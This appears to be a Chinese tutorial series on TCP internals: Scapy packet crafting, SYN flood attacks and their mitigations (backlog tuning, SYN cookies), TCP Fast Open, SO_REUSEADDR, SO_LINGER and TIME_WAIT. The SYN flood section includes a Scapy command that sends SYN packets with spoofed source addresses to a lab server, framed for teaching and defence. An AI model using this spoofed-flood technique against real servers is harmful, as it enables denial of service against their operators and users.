Scapy是一个用 Python 写的强大的交互式数据包处理程序。它可以让用户发送、侦听和解析并伪装网络报文。官网地址：[scapy.net/](https://scapy.net/) ，安装步骤见官网。

安装好以后执行`sudo scapy`就可以进入一个交互式 shell

```
$ sudo scapy
>>>
```

### 发送第一个包

在服务器（10.211.55.10）开启 tcpdump 抓包

```
sudo tcpdump -i any host 10.211.55.5 -nn
```

在客户端（10.211.55.5）启动`sudo scapy`输入下面的指令

```
send(IP(dst="10.211.55.10")/ICMP())
.
Sent 1 packets.
```

服务端的抓包文件显示服务端收到了客户端的`ICMP echo request`

```
06:12:47.466874 IP 10.211.55.5 > 10.211.55.10: ICMP echo request, id 0, seq 0, length 8
06:12:47.466910 IP 10.211.55.10 > 10.211.55.5: ICMP echo reply, id 0, seq 0, length 8
```

### scapy 构造数据包的方式

可以看到构造一个数据包非常简单，scapy 采用一个非常简单易懂的方式：**使用`/`来「堆叠」多个层的数据**

比如这个例子中的 `IP()/ICMP()`，如果要用 TCP 发送一段字符串`hello, world`，就可以这样堆叠：

```
IP(src="10.211.55.99", dst="10.211.55.10") / TCP(sport=9999, dport=80) / "hello, world"
```

如果要发送 DNS 查询，可以这样堆叠：

```
IP(dst="8.8.8.8") / UDP() /DNS(rd=1, qd=DNSQR(qname="www.baidu.com"))
```

如果想拿到返回的结果，可以使用`sr`（send-receive）函数，与它相关的有一个特殊的函数`sr1`，只取第一个应答数据包，比如

```
>>> res = sr1(IP(dst="10.211.55.10")/ICMP())
>>> res
<IP  version=4 ihl=5 tos=0x0 len=28 id=65126 flags= frag=0 ttl=64 proto=icmp chksum=0xf8c5 src=10.211.55.10 dst=10.211.55.5 |<ICMP  type=echo-reply code=0 chksum=0xffff id=0x0 seq=0x0 |>>
```

------

## SYN flood 攻击

SYN Flood 是一种广为人知的 DoS（拒绝服务攻击） 想象一个场景：客户端大量伪造 IP 发送 SYN 包，服务端回复的 ACK+SYN 去到了一个「未知」的 IP 地址，势必会造成服务端大量的连接处于 SYN_RCVD 状态，而服务器的半连接队列大小也是有限的，如果半连接队列满，也会出现无法处理正常请求的情况。



![img](%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE.assets/16ba36e681b24ff3)



在客户端用 scapy 执行的 sr1 函数向目标机器（10.211.55.5）发起 SYN 包

```
sr1(IP(src="23.16.*.*", dst="10.211.55.10") / TCP(dport=80, flags="S") )
```

其中服务端收到的 SYN 包的源地址将会是 23.16 网段内的随机 IP，隐藏了自己的 IP。

```
netstat -lnpat | grep :80

tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -
tcp        0      0 10.211.55.10:80         23.16.63.3:20           SYN_RECV    -
tcp        0      0 10.211.55.10:80         23.16.64.3:20           SYN_RECV    -
tcp        0      0 10.211.55.10:80         23.16.62.3:20           SYN_RECV    -
```

在服务端抓包看到下面的抓包



![img](%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE.assets/16ba36e689c9cae6)



可以看到短时间内，服务端收到了很多虚假 IP 的 SYN 包，马上回复了 SYN+ACK 给这些虚假 IP 的服务器。这些虚假的 IP 当然一脸懵逼，我都没发 SYN，你给我发 SYN+ACK 干嘛，于是马上回了 RST。

使用 netstat 查看服务器的状态

```
netstat -lnpat | grep :80
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -
tcp        0      0 10.211.55.10:80         23.16.63.3:20           SYN_RECV    -
tcp        0      0 10.211.55.10:80         23.16.64.3:20           SYN_RECV    -
tcp        0      0 10.211.55.10:80         23.16.62.3:20           SYN_RECV    -
```

服务端的 SYN_RECV 的数量偶尔涨起来又降下去，因为对端回了 RST 包，这条连接在收到 RST 以后就被从半连接队列清除了。如果攻击者控制了大量的机器，同时发起 SYN，依然会对服务器造成不小的影响。

而且 `SYN+ACK` 去到的不知道是哪里的主机，是否回复 RST 完全取决于它自己，万一它不直接忽略掉 SYN，不回复 RST，问题就更严重了。服务端以为自己的 SYN+ACK 丢失了，会进行重传。

我们来模拟一下这种场景。因为没有办法在去 `SYN+ACK` 包去到的主机的配置，可以在服务器用 iptables 墙掉主机发过来的 RST 包，模拟主机没有回复 RST 包的情况。

```
sudo  iptables --append INPUT  --match tcp --protocol tcp --dst 10.211.55.10 --dport 80 --tcp-flags RST RST --jump DROP
```

这个时候再次使用 netstat 查看，满屏的 SYN_RECV 出现了



![img](%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE.assets/16ba36e691c556be)



通过服务端抓包的文件也可以看到，服务端因为 SYN+ACK 丢了，然后进行重传。重传的次数由`/proc/sys/net/ipv4/tcp_synack_retries`文件决定，在我的 Centos 上这个默认值为 5。



![img](%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE.assets/16ba36e68300ff13)



重传 5 次 SYN+ACK 包，重传的时间依然是指数级退避（1s、2s、4s、8s、16s），发送完最后一次 SYN+ACK 包以后，等待 32s，服务端才会丢弃掉这个连接，把处于SYN_RECV 状态的 socket 关闭。

在这种情况下，一次恶意的 SYN 包，会占用一个服务端连接 63s（1+2+4+8+16+32），如果这个时候有大量的恶意 SYN 包过来连接服务器，很快半连接队列就被占满，不能接收正常的用户请求。

## 如何应对 SYN Flood 攻击

常见的有下面这几种方法

#### 增加 SYN 连接数：tcp_max_syn_backlog

调大`net.ipv4.tcp_max_syn_backlog`的值，不过这只是一个心理安慰，真有攻击的时候，这个再大也够用。

#### 减少`SYN+ACK`重试次数：tcp_synack_retries

重试次数由 `/proc/sys/net/ipv4/tcp_synack_retries`控制，默认情况下是 5 次，当收到`SYN+ACK`故意不回 ACK 或者回复的很慢的时候，调小这个值很有必要。

------

还有一个比较复杂的 tcp_syncookies 机制，下面来详细介绍一下。

## SYN Cookie 机制

SYN Cookie 技术最早是在 1996 年提出的，最早就是用来解决 SYN Flood 攻击的，现在服务器上的 tcp_syncookies 都是默认等于 1，表示连接队列满时启用，等于 0 表示禁用，等于 2 表示始终启用。由`/proc/sys/net/ipv4/tcp_syncookies`控制。

SYN Cookie 机制其实原理比较简单，就是在三次握手的最后阶段才分配连接资源，如下图所示。



![img](%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE.assets/16ba36e691d04901)



SYN Cookie 的原理是基于「无状态」的机制，服务端收到 SYN 包以后不马上分配为 `Inbound SYN`分配内存资源，而是根据这个 SYN 包计算出一个 Cookie 值，作为握手第二步的序列号回复 SYN+ACK，等对方回应 ACK 包时校验回复的 ACK 值是否合法，如果合法才三次握手成功，分配连接资源。

Cookie 值的计算规则是怎么样的呢？Cookie 总长度是 32bit。这部分的源码见 Linux 源码：[syncookies.c](https://github.com/torvalds/linux/blob/79c0ef3e85c015b0921a8fd5dd539d1480e9cd6c/net/ipv4/syncookies.c#L95)

```
static __u32 secure_tcp_syn_cookie(__be32 saddr, __be32 daddr, __be16 sport,
				   __be16 dport, __u32 sseq, __u32 data)
{
	/*
	 * Compute the secure sequence number.
	 * The output should be:
	 *   HASH(sec1,saddr,sport,daddr,dport,sec1) + sseq + (count * 2^24)
	 *      + (HASH(sec2,saddr,sport,daddr,dport,count,sec2) % 2^24).
	 * Where sseq is their sequence number and count increases every
	 * minute by 1.
	 * As an extra hack, we add a small "data" value that encodes the
	 * MSS into the second hash value.
	 */
	u32 count = tcp_cookie_time(); // 系统开机经过的分钟数
	return (cookie_hash(saddr, daddr, sport, dport, 0, 0) + // 第一次 hmac 哈希
		sseq + // 客户端传过来的 SEQ 序列号
		 (count << COOKIEBITS) + // 系统开机经过的分钟数左移 24 位
		((cookie_hash(saddr, daddr, sport, dport, count, 1) + data) 
		 & COOKIEMASK)); // 增加 MSS 值做第二次 hmac 哈希然后取低 24 位
}
```

其中 COOKIEBITS 等于 24，COOKIEMASK 为 低 24 位的掩码，也即 0x00FFFFFF，count 为系统的分钟数，sseq 为客户端传过来的 SEQ 序列号。

SYN Cookie 看起来比较完美，但是也有不少的问题。

第一，这里的 MSS 值只能是少数的几种，由数组 msstab 值决定

```
static __u16 const msstab[] = {
	536,
	1300,
	1440,	/* 1440, 1452: PPPoE */
	1460,
};
```

第二，因为 syn-cookie 是一个无状态的机制，服务端不保存状态，不能使用其它所有 TCP 选项，比如 WScale，SACK 这些。因此要想变相支持这些选项就得想想其它的偏门，如果启用了 Timestamp 选项，可以把这些值放在 Timestamp 选项值里面。

```
+-----------+-------+-------+--------+
|  26 bits  | 1 bit | 1 bit | 4 bits |
| Timestamp |  ECN  | SACK  | WScale |
+-----------+-------+-------+--------+
```

不在上面这个四个字段中的扩展选项将无法支持了，如果没有启用 Timestamp 选项，那就彻底凉凉了。

## 小结

这篇文章介绍了用 Scapy 工具构造 SYN Flood 攻击，然后介绍了缓解 SYN Flood 攻击的几种方式，有利有弊，看实际场景启用不同的策略。

前面几篇文章讲了三次握手的过程，可能你会有觉得好麻烦呀，要发数据先得有三次包交互建连。三次握手带来的延迟使得创建一个新 TCP 连接代价非常大，所有有了各种连接重用的技术。

但是连接并不是想重用就重用的，在不重用连接的情况下，如何减少新建连接代理的性能损失呢？

于是人们提出了 TCP 快速打开（TCP Fast Open，TFO），尽可能降低握手对网络延迟的影响。今天我们就讲讲这其中的原理。

## TFO 与 shadowsocks

最开始知道 TCP Fast Open 是在玩 shadowsocks 时在它的 [wiki](https://github.com/shadowsocks/shadowsocks/wiki/TCP-Fast-Open) 上无意中逛到的。专门有一页介绍可以启用 TFO 来减低延迟。原文摘录如下：

```
If both of your server and client are deployed on Linux 3.7.1 or higher, you can turn on fast_open for lower latency.

First set fast_open to true in your config.json.

Then turn on fast open on your OS temporarily:

echo 3 > /proc/sys/net/ipv4/tcp_fastopen
```

## TFO 简介

TFO 是在原来 TCP 协议上的扩展协议，它的主要原理就在发送第一个 SYN 包的时候就开始传数据了，不过它要求当前客户端之前已经完成过「正常」的三次握手。快速打开分两个阶段：请求 Fast Open Cookie 和 真正开始 TCP Fast Open

请求 Fast Open Cookie 的过程如下：

- 客户端发送一个 SYN 包，头部包含 Fast Open 选项，且该选项的Cookie 为空，这表明客户端请求 Fast Open Cookie
- 服务端收取 SYN 包以后，生成一个 cookie 值（一串字符串）
- 服务端发送 SYN + ACK 包，在 Options 的 Fast Open 选项中设置 cookie 的值
- 客户端缓存服务端的 IP 和收到的 cookie 值



![img](%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE.assets/169e2dc0888e6b83)



第一次过后，客户端就有了缓存在本地的 cookie 值，后面的握手和数据传输过程如下：

- 客户端发送 SYN 数据包，里面包含数据和之前缓存在本地的 Fast Open Cookie。（注意我们此前介绍的所有 SYN 包都不能包含数据）
- 服务端检验收到的 TFO Cookie 和传输的数据是否合法。如果合法就会返回 SYN + ACK 包进行确认并将数据包传递给应用层，如果不合法就会丢弃
- 服务端程序收到数据以后可以握手完成之前发送响应数据给客户端了
- 客户端发送 ACK 包，确认第二步的 SYN 包和数据（如果有的话）
- 后面的过程就跟非 TFO 连接过程一样了



![img](%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE.assets/169e2dc0821ff4f9)



## 抓包演示

上面说的都是理论分析，下面我们用实际的抓包来看快速打开的过程。

因为在 Linux 上快速打开是默认关闭的，需要先开启 TFO，如前面 shadowsocks 的文档所示

```
echo 3 > /proc/sys/net/ipv4/tcp_fastopen
```

接下来用 nginx 来充当服务器，在服务器 c2 上安装 nginx，修改 nginx 配置`listen 80 fastopen=256;`，使之支持 TFO

```
server {
        listen 80  fastopen=256;
        server_name test.ya.me;
        access_log  /var/log/nginx/host.test.ya.me main;
        location /{
            default_type text/html;
            return 200 '<html>Hello, Nginx</html>';
        }
}
```

下面来调整客户端的配置，用另外一台 Centos7 的机器充当客户端（记为c1），在我的 Centos7.4 系统上 curl 的版本比较旧，是`7.29`版本

```
curl -V
curl 7.29.0 (x86_64-redhat-linux-gnu) libcurl/7.29.0 NSS/3.36 zlib/1.2.7 libidn/1.28 libssh2/1.4.3
```

这个版本的 curl 还不支持 TFO 选项，需要先升级到最新版本。升级的过程也比较简单，就分三步

```
// 1. 增加 city-fan 源
rpm -Uvh http://www.city-fan.org/ftp/contrib/yum-repo/city-fan.org-release-2-1.rhel7.noarch.rpm
// 2. 修改 city-fan.org.repo，把 enable=0 改为 enable=1
vim /etc/yum.repos.d/city-fan.org.repo
// 2. 升级 curl
yum update curl
// 验证是不是最新版本
curl -V
curl 7.64.1 (x86_64-redhat-linux-gnu) libcurl/7.64.1 NSS/3.36 zlib/1.2.7 libpsl/0.7.0 (+libicu/50.1.2) libssh2/1.8.2 nghttp2/1.31.1
```

下面就可以来演示快速打开的过程了。

**第一次：请求 Fast Open Cookie**

在客户端 c1 上用 curl 发起第一次请求，`curl --tcp-fastopen http://test.ya.me`，抓包如下图

![img](%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE.assets/169e2dc08502c36d)



逐个包分析一下

- 第 1 个 SYN 包：wireshark 有标记`TFO=R`，看下这个包的TCP 首部

    ![img](%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE.assets/169e2dc08cc8e768)

    这个首部包含了 TCP Fast Open 选项，但是 Cookie 为空，表示向服务器请求新的 Cookie。

    

- 第 2 个包是 SYN + ACK 包，wireshark 标记为`TFO=C`，这个包的首部如下图所示

    ![img](%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE.assets/169e2dc082284dd4)

    这时，服务器 c2 已经生产了一个值为 "16fba4d72be34e8c" 的 Cookie，放在首部的TCP fast open 选项里

    

- 第 3 个包是客户端 c1 对服务器的 SYN 包的确认包。到此三次握手完成，这个过程跟无 TFO 三次握手唯一的不同点就在于 Cookie 的请求和返回

- 后面的几个包就是正常的数据传输和四次挥手断开连接了，跟正常无异，不再详细介绍。

**第二次：真正的快速打开**

在客户端 c1 上再次请求一次`curl --tcp-fastopen http://test.ya.me`，抓包如下图`

![img](%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE.assets/169e2dc08e4beb55)



逐个包分析一下

- 第 1 个包就很亮瞎眼，wireshark 把这个包识别为了 HTTP 包，展开头部看一下

    ![img](%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE.assets/169e2dc0bb2bbb78)

    这个包本质是一个 SYN 包，只是数据跟随 SYN 包一起发送，在 TCP 首部里也包含了第一次请求的 Cookie

- 第 2 个包是服务端收到了 Cookie 进行合法性校验通过以后返回的SYN + ACK 包

- 第 3、4 个包分别是客户端回复给服务器的 ACK 确认包和服务器返回的 HTTP 响应包。因为我是在局域网内演示，延迟太小，ACK 回的太快了，所以看到的是先收到 ACK 再发送响应数据包，在实际情况中这两个包的顺序可能是不确定的。

## TCP Fast Open 的优势

一个最显著的优点是可以利用握手去除一个往返 RTT，如下图所示

![img](%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE.assets/169e2dc0c15f46e5)

在开启 TCP Fast Open以后，从第二次请求开始，就可以在一个 RTT 时间拿到响应的数据。



还有一些其它的优点，比如可以防止 SYN-Flood 攻击之类的

## 代码中是怎么使用的 Fast Open

用 strace 命令来看一下 curl 的过程

加上 --tcp-fastopen 选项以后的 strace 输出`sudo strace curl --tcp-fastopen http://test.ya.me` 可以看到客户端没有使用 connect 建连，而是直接调用了 sendto 函数，加上了 MSG_FASTOPEN flag 连接服务端同时发送数据。



![img](%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE.assets/169e2dc0c2898f97)



没有加上 --tcp-fastopen 选项的情况下的 strace 输出如下 `sudo strace curl http://test.ya.me`

![img](%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE.assets/169e2dc0c9aa70d0)

在没有启用 Fast Open 的情况下，会先调用 connect 进行握手



## 小结

这篇文章主要用 curl 命令演示了 TCP 快速打开的详细过程和原理

1. 客户端发送一个 SYN 包，头部包含 Fast Open 选项，且该选项的 Cookie 长度为 0
2. 服务端根据客户端 IP 生成 cookie，放在 SYN+ACK 包中一同发回客户端
3. 客户端收到 Cookie 以后缓存在自己的本地内存
4. 客户端再次访问服务端时，在 SYN 包携带数据，并在头部包含 上次缓存在本地的 TCP cookie
5. 如果服务端校验 Cookie 合法，则在客户端回复 ACK 前就可以直接发送数据。如果 Cookie 不合法则按照正常三次握手进行。

可以看到历代大牛在降低网络延迟方面的鬼斧神工般的努力，现在主流操作系统和浏览器都支持这个选项了。

前面介绍到四次挥手的时候有讲到，**主动断开**连接的那一端需要等待 2 个 MSL 才能最终释放这个连接。一般而言，主动断开连接的都是客户端，如果是服务端程序重启或者出现 bug 崩溃，这时服务端会主动断开连接，如下图所示



![img](%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE.assets/169230452f26de90)



因为要等待 2 个 MSL 才能最终释放连接，所以如果这个时候程序马上启动，就会出现`Address already in use`错误。要过 1 分钟以后才可以启动成功。如果你写了一个 web 服务器，崩溃以后被脚本自动拉起失败，需要等一分钟才正常，运维可能要骂娘了。

下面来写一段简单的代码演示这个场景是如何产生的。

```
public class ReuseAddress {
    public static void main(String[] args) throws IOException {
        ServerSocket serverSocket = new ServerSocket();
        // setReuseAddress 必须在 bind 函数调用之前执行
        serverSocket.setReuseAddress(false);
        serverSocket.bind(new InetSocketAddress(8080));
        System.out.println("reuse address: " + serverSocket.getReuseAddress());
        while (true) {
            Socket socket = serverSocket.accept();
            System.out.println("incoming socket..");
            OutputStream out = socket.getOutputStream();
            out.write("Hello\n".getBytes());
            out.close();
        }
    }
}
```

这段代码的功能是启动一个 TCP 服务器，客户端连上来就返回了一个 "Hello\n" 回去。

使用 javac 编译 class 文件`javac ReuseAddress.java;`，然后用 java 命令运行`java -cp . ReuseAddress`。使用 nc 命令连接 8080 端口`nc localhost 8080`，应该会马上收到服务端返回的"Hello\n"字符串。现在 kill 这个进程，马上重启这个程序就可以看到程序启动失败，报 socket bind 失败，堆栈如下：

```
Exception in thread "main" java.net.BindException: 地址已在使用 (Bind failed)
	at java.net.PlainSocketImpl.socketBind(Native Method)
	at java.net.AbstractPlainSocketImpl.bind(AbstractPlainSocketImpl.java:387)
	at java.net.ServerSocket.bind(ServerSocket.java:375)
	at java.net.ServerSocket.bind(ServerSocket.java:329)
	at ReuseAddress.main(ReuseAddress.java:18)
```

将代码修改为`serverSocket.setReuseAddress(true);`，再次重复上面的测试过程，再也不会出现上述异常了。

## 0x02 为什么需要 SO_REUSEADDR 参数

服务端主动断开连接以后，需要等 2 个 MSL 以后才最终释放这个连接，重启以后要绑定同一个端口，默认情况下，操作系统的实现都会阻止新的监听套接字绑定到这个端口上。

我们都知道 TCP 连接由四元组唯一确定。形式如下

{local-ip-address:local-port , foreign-ip-address:foreign-port}

一个典型的例子如下图



![img](%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE.assets/169230452a3ad54a)



TCP 要求这样的四元组必须是唯一的，但大多数操作系统的实现要求更加严格，只要还有连接在使用这个本地端口，则本地端口不能被重用（bind 调用失败）

启用 SO_REUSEADDR 套接字选项可以解除这个限制，默认情况下这个值都为 0，表示关闭。在 Java 中，reuseAddress 不同的 JVM 有不同的实现，在我本机上，这个值默认为 1 允许端口重用。但是为了保险起见，写 TCP、HTTP 服务一定要主动设置这个参数为 1。

## 0x03 是不是只有处于 TIME_WAIT 才允许端口复用？

查看 Java 中 ServerSocket.setReuseAddress 的文档，有如下的说明

```
/**
 * Enable/disable the {@link SocketOptions#SO_REUSEADDR SO_REUSEADDR}
 * socket option.
 * <p>
 * When a TCP connection is closed the connection may remain
 * in a timeout state for a period of time after the connection
 * is closed (typically known as the {@code TIME_WAIT} state
 * or {@code 2MSL} wait state).
 * For applications using a well known socket address or port
 * it may not be possible to bind a socket to the required
 * {@code SocketAddress} if there is a connection in the
 * timeout state involving the socket address or port.
* /
```

假设因为网络的原因，客户端没有回发 FIN 包，导致服务器端处于 FIN_WAIT2 状态，而非 TIME_WAIT 状态，那设置 SO_REUSEADDR 还会生效吗？



![img](%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE.assets/169252c596fbaac0)



来做一个实验，现在有两台机器c1（充当客户端），c2（充当服务器）。在客户端 c1 利用防火墙拦截掉所有发出的 FIN 包：`sudo iptables --append OUTPUT --match tcp --protocol tcp --dport 8080 --tcp-flags FIN FIN --jump DROP`。 在c1 上使用`nc c2 8080`发起 tcp 连接，随后杀掉 c2 的进程， 因为服务端收不到客户端发过来的 FIN 包，也即四次挥手中的第 3 步没能成功，服务端此时将处于 FIN_WAIT2 状态。

```
ya@c2 ~$ sudo netstat -lnpa  | grep 8080
tcp6       0      0 10.211.55.10:8080       10.211.55.5:39664       FIN_WAIT2   -
```

将 SO_REUSEADDR 设置为 1，重复上面的测试过程，将发现不会出现异常。将 SO_REUSEADDR 设置为 0，则会出现 Address already in use 异常。

因此，不一定是要处于 TIME_WAIT 才允许端口复用的，只是大都是情况下，主动关闭连接的服务端都会处于 TIME_WAIT。如果不把 SO_REUSEADDR 设置为 1，服务器将等待 2 个 MSL 才可以重新绑定原端口

## 0x04 为什么通常不会在客户端上出现

通常情况下都是客户端主动关闭连接，那客户端那边为什么不会有问题呢？

因为客户端都是用的临时端口，这些临时端口与处于 TIME_WAIT 状态的端口恰好相同的可能性不大，就算相同换一个新的临时端口就好了。

## 小结

这篇文章主要讲了 SO_REUSEADDR 套接字属性出现的背景和分析，随后讲解了为什么需要 SO_REUSEADDR 参数，以及为什么客户端不需要关心这个参数。

# Socket 选项之 SO_LINGER

这篇文章我们来讲一个新的参数 SO_LINGER，以一个小测验来开始今天的文章。 请看下面的代码：

```
Socket socket = new Socket();
InetSocketAddress serverSocketAddress = new InetSocketAddress("10.0.0.3", 8080);
socket.connect(serverSocketAddress);

byte[] msg = getMessageBytes(); 
socket.getOutputStream().write(msg);

socket.close();
```

会发现如下哪个选项的事情

1. 服务器收到 msg 所有内容
2. 服务器会收到 msg 部分内容
3. 服务器会抛出异常

简化为图如下：

![img](%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE.assets/16a02b90d9589384)



当我们调用 write 函数向内核写入一段数据时，内核会把这段时间放入一个缓冲区 buffer，如下图所示



![img](%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE.assets/16a02b90d978ff34)



## 关闭连接的两种方式

前面有介绍过有两种方式可以关闭 TCP 连接

- FIN：优雅关闭，发送 FIN 包表示自己这端所有的数据都已经发送出去了，后面不会再发送数据
- RST：强制连接重置关闭，无法做出什么保证

当调用 socket.close() 的时候会发生什么呢？

正常情况下

- 操作系统等所有的数据发送完才会关闭连接
- 因为是主动关闭，所以连接将处于 TIME_WAIT 两个 MSL

前面说了正常情况，那一定有不正常的情况下，如果我们不想等那么久才彻底关闭这个连接怎么办，这就是我们这篇文章介绍的主角 SO_LINGER

## SO_LINGER

Linux 的套接字选项SO_LINGER 用来改变socket 执行 close() 函数时的默认行为。

linger 的英文释义有逗留、徘徊、继续存留、缓慢消失的意思。这个释义与这个参数真正的含义很接近。

SO_LINGER 启用时，操作系统开启一个定时器，在定时器期间内发送数据，定时时间到直接 RST 连接。

SO_LINGER 参数是一个 linger 结构体，代码如下

```
struct linger {
    int l_onoff;    /* linger active */
    int l_linger;   /* how many seconds to linger for */
};
```

第一个字段 l_onoff 用来表示是否启用 linger 特性，非 0 为启用，0 为禁用 ，linux 内核默认为禁用。这种情况下 close 函数立即返回，操作系统负责把缓冲队列中的数据全部发送至对端

第二个参数 l_linger 在 l_onoff 为非 0 （即启用特性）时才会生效。

- 如果 l_linger 的值为 0，那么调用 close，close 函数会立即返回，同时丢弃缓冲区内所有数据并立即发送 RST 包重置连接
- 如果 l_linger 的值为非 0，那么此时 close 函数在阻塞直到 l_linger 时间超时或者数据发送完毕，发送队列在超时时间段内继续尝试发送，如果发送完成则皆大欢喜，超时则直接丢弃缓冲区内容 并 RST 掉连接。

## 实验时间

我们用一个例子来说明上面的三种情况。

服务端代码如下，监听 9999 端口，收到客户端发过来的数据不做任何处理。

```
import java.util.Date;
public class Server {

    public static void main(String[] args) throws Exception {
        ServerSocket serverSocket = new ServerSocket();
        serverSocket.setReuseAddress(true);
        serverSocket.bind(new InetSocketAddress(9999));

        while (true) {
            Socket socket = serverSocket.accept();
            InputStream input = socket.getInputStream();
            ByteArrayOutputStream output = new ByteArrayOutputStream();
            byte[] buffer = new byte[1];
            int length;
            while ((length = input.read(buffer)) != -1) {
                output.write(buffer, 0, length);
            }
            String req = new String(output.toByteArray(), "utf-8");
            System.out.println(req.length());
            socket.close();
        }
    }
}
```

客户端代码如下，客户端往服务器发送 1000 个 "hel" 字符，代码最后输出了 close 函数调用的耗时

```
import java.net.SocketAddress;

public class Client {
    private static int PORT = 9999;
    private static String HOST = "c1";

    public static void main(String[] args) throws Exception {
        Socket socket = new Socket();
        // 测试#1: 默认设置
        socket.setSoLinger(false, 0);
        // 测试#2
        // socket.setSoLinger(true, 0);
        // 测试#3
        //socket.setSoLinger(true, 1);

        SocketAddress address = new InetSocketAddress(HOST, PORT);
        socket.connect(address);

        OutputStream output = socket.getOutputStream();
        StringBuilder sb = new StringBuilder();
        for (int i = 0; i < 10000; i++) {
            sb.append("hel");
        }
        byte[] request = sb.toString().getBytes("utf-8");
        output.write(request);
        long start = System.currentTimeMillis();
        socket.close();
        long end = System.currentTimeMillis();
        System.out.println("close time cost: " + (end - start));
    }
}
```

> 情况#1 `socket.setSoLinger(false, 0)`

这个是默认的行为，close 函数立即返回，且服务器应该会收到所有的 30kB 的数据。运行代码同时 wireshark 抓包，客户端输出 close 的耗时为

```
close time cost: 0
```

wireshark 抓包情况如下，可以看到完成正常四次挥手



![img](%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE.assets/16a02b90d97911b6)



整个发送的包大小为 30kB



![img](%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE.assets/16a02b90d96bca36)



> 情况#2 `socket.setSoLinger(true, 0)` 这种情况下，理论上 close 函数应该立刻返回，同时丢弃缓冲区的内容，可能服务端收到的数据只是部分的数据。

客户端终端的输出如下：

```
close time cost: 0
```

服务端抛出了异常，输出如下：

```
Exception in thread "main" java.net.SocketException: Connection reset
	at java.net.SocketInputStream.read(SocketInputStream.java:210)
	at java.net.SocketInputStream.read(SocketInputStream.java:141)
	at java.net.SocketInputStream.read(SocketInputStream.java:127)
	at Server.main(Server.java:21)
```

通过 wireshark 抓包如下：

![img](%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE.assets/16a02b90e76e83ec)



可以看到，没有执行正常的四次挥手，客户端直接发送 RST 包，重置了连接。

传输包的大小也没有30kB，只有14kB，说明丢弃了内核缓冲区的 16KB 的数据。

![img](%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE.assets/16a02b90ea987de8)



**情况#3 `socket.setSoLinger(true, 1);`**

这种情况下，close 函数不会立刻返回，如果在 1s 内数据传输结束，则皆大欢喜，如果在 1s 内数据没有传输完，就直接丢弃掉，同时 RST 连接

运行代码，客户端输出显示 close 函数耗时 17ms，不再是前面两个例子中的 0 ms 了。

```
close time cost: 17
```

通过 wireshark 抓包可以看到完成了正常的四次挥手



![img](%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE.assets/16a02b91181c0190)



## 小结

这篇文章主要介绍了 SO_LINGER 套接字选项对关闭套接字的影响。默认行为下是调用 close 立即返回，但是如果有数据残留在套接字发送缓冲区中，系统将试着把这些数据发送给对端，SO_LINGER 可以改变这个默认设置，具体的规则见下面的思维导图。



![img](%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE.assets/16a02b91ae14ef21)

# TIME_WAIT

TIME_WAIT 是 TCP 所有状态中最不好理解的一种状态。首先，我们需要明确，**只有主动断开的那一方才会进入 TIME_WAIT 状态**，且会在那个状态持续 2 个 MSL（Max Segment Lifetime）。

为了讲清楚 TIME_WAIT，需要先介绍一下 MSL 的概念。

## MSL：Max Segment Lifetime

MSL（报文最大生存时间）是 TCP 报文在网络中的最大生存时间。这个值与 IP 报文头的 TTL 字段有密切的关系。

IP 报文头中有一个 8 位的存活时间字段（Time to live, TTL）如下图。 这个存活时间存储的不是具体的时间，而是一个 IP 报文最大可经过的路由数，每经过一个路由器，TTL 减 1，当 TTL 减到 0 时这个 IP 报文会被丢弃。



![img](%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE.assets/16b54c4b9038f7aa)



TTL 经过路由器不断减小的过程如下图所示，假设初始的 TTL 为 12，经过下一个路由器 R1 以后 TTL 变为 11，后面每经过一个路由器以后 TTL 减 1



![img](%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE.assets/16b54c4b904314f8)



